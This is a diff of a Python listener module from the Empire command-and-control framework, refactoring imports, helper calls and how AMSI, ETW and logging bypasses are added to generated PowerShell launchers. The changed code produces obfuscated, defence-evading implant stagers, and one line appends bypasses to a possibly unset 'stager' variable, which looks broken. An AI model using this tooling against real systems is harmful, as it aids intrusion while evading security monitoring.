@@ -1,41 +1,33 @@
 from __future__ import print_function
-import os, sys, logging, time, copy, string, base64, json, random, ssl
-from pydispatch import dispatcher
-from flask import Flask, request, make_response, Response, send_from_directory
 
-# extras
-from builtins import str
-from builtins import object
-import logging
 import base64
-import sys
-import random
-import string
-import os
-import ssl
-import time
 import copy
 import json
+import logging
+import os
+import random
+import ssl
+import string
 import sys
-import threading
+import time
 import urllib.parse
+from builtins import object
+from builtins import str
+from typing import List
 
+from flask import Flask, request, make_response, Response
 from pydispatch import dispatcher
 
-# Empire imports
-from empire.server.common import helpers
-from empire.server.common import agents
 from empire.server.common import encryption
-from empire.server.common import packets
-from empire.server.common import messages
-from empire.server.common import templating
-from empire.server.common import obfuscation
-from empire.server.common import bypasses
-from empire.server.database.base import Session
-from empire.server.database import models
-
-# Malleable imports
+from empire.server.common import helpers
 from empire.server.common import malleable
+from empire.server.common import obfuscation
+from empire.server.common import packets
+from empire.server.common import templating
+from empire.server.database import models
+from empire.server.database.base import Session
+from empire.server.utils import data_util
+
 
 class Listener(object):
 
@@ -142,7 +134,7 @@ class Listener(object):
         self.header_offset = random.randint(0, 64)
 
         # set the default staging key to the controller db default
-        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
+        self.options['StagingKey']['Value'] = str(data_util.get_config('staging_key')[0])
 
     def default_response(self):
         """
@@ -336,11 +328,11 @@ class Listener(object):
 
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None,
-                          stager=None, scriptLogBypass=None, AMSIBypass=False, AMSIBypass2=False, ETWBypass=False):
+                          stager=None, bypasses: List[str]=None):
         """
         Generate a basic launcher for the specified listener.
         """
-
+        bypasses = [] if bypasses is None else bypasses
         if not language:
             print(helpers.color('[!] listeners/template generate_launcher(): no language specified!'))
             return None
@@ -379,17 +371,8 @@ class Listener(object):
 
                 if safeChecks.lower() == 'true':
                     launcherBase = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-                    # ScriptBlock Logging bypass
-                if scriptLogBypass:
-                    launcherBase += bypasses.scriptBlockLogBypass()
-                if ETWBypass:
-                    launcherBase += bypasses.ETWBypass()
-                # @mattifestation's AMSI bypass
-                if AMSIBypass:
-                    launcherBase += bypasses.AMSIBypass()
-                # rastamouse AMSI bypass
-                if AMSIBypass2:
-                    launcherBase += bypasses.AMSIBypass2()
+                for bypass in bypasses:
+                    stager += bypass
                 if safeChecks.lower() == 'true':
                     launcherBase += "};"
                     launcherBase += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
@@ -629,7 +612,7 @@ class Listener(object):
             f.close()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = helpers.keyword_obfuscation(stager)
+            stager = data_util.keyword_obfuscation(stager)
 
             # patch in custom headers
             if profile.stager.client.headers:
@@ -739,7 +722,7 @@ class Listener(object):
             f.close()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            code = helpers.keyword_obfuscation(code)
+            code = data_util.keyword_obfuscation(code)
 
             # path in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -1251,7 +1234,7 @@ class Listener(object):
                                             hopListenerName = request.headers.get('Hop-Name')
                                             if hopListenerName:
                                                 try:
-                                                    hopListener = helpers.get_listener_options(hopListenerName)
+                                                    hopListener = data_util.get_listener_options(hopListenerName)
                                                     tempListenerOptions = copy.deepcopy(listenerOptions)
                                                     tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                                                 except TypeError:
